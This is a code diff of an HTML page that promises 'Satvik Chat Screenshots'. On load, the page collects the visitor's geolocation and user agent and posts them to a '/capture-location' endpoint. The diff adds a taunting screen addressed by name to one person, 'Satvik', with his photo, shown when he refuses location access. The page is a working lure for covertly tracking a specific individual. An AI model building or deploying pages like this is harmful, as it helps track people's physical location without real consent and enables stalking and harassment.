@@ -3,34 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Satvik Chat</title>
+    <title>Loading...</title>
     <style>
-        body { margin:0; background:#000; color:#fff; font-family:Arial; text-align:center; }
-        .content { max-width: 700px; margin:20px auto; padding:10px; display:none; }
-        img { max-width:100%; margin:15px 0; border:2px solid #333; border-radius:8px; }
-        .denied { height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; background:#111; }
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        .content, .denied {
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            padding: 20px;
+        }
+        img {
+            max-width: 85%;
+            margin: 25px 0;
+            border: 2px solid #555;
+            border-radius: 12px;
+        }
+        h2 {
+            color: #ff5555;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="denied" id="denied">
-        <h2>Location Access Required</h2>
-        <p>Please allow location to view the screenshots.</p>
-        <button onclick="requestLocation()" style="padding:15px 30px; font-size:18px;">Allow Location</button>
-    </div>
-
+    <!-- Screenshots shown only if location allowed -->
     <div class="content" id="content">
         <h1>Satvik Chat Screenshots</h1>
-        
-        <img src="/static/0jAV3.png" alt="1">
-        <img src="/static/dX66Z.png" alt="2">
-        <img src="/static/JQyOg.png" alt="3">
-        <img src="/static/aryUv.png" alt="4">
-        <img src="/static/CiyTj.png" alt="5">
+        <img src="/static/0jAV3.png" alt="">
+        <img src="/static/dX66Z.png" alt="">
+        <img src="/static/JQyOg.png" alt="">
+        <img src="/static/aryUv.png" alt="">
+        <img src="/static/CiyTj.png" alt="">
+    </div>
+
+    <!-- Denied Message -->
+    <div class="denied" id="denied">
+        <h2>Satvik we know its you</h2>
+        <h2>We have blocked your location</h2>
+        <h2>We ain't showing you what's in this website</h2>
+        <img src="/static/satvik.jpg" alt="Satvik">
+        <p style="margin-top: 40px; font-size: 20px;">😂</p>
     </div>
 
     <script>
         function requestLocation() {
+            if (!navigator.geolocation) {
+                showDenied();
+                return;
+            }
+
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     fetch('/capture-location', {
@@ -43,13 +74,18 @@
                             userAgent: navigator.userAgent
                         })
                     });
-                    document.getElementById('denied').style.display = 'none';
-                    document.getElementById('content').style.display = 'block';
+                    document.getElementById('content').style.display = 'flex';
                 },
-                () => alert("Location access denied. Cannot show content.")
+                () => {
+                    showDenied();
+                }
             );
         }
-        // Auto trigger
+
+        function showDenied() {
+            document.getElementById('denied').style.display = 'flex';
+        }
+
         window.onload = requestLocation;
     </script>
 </body>
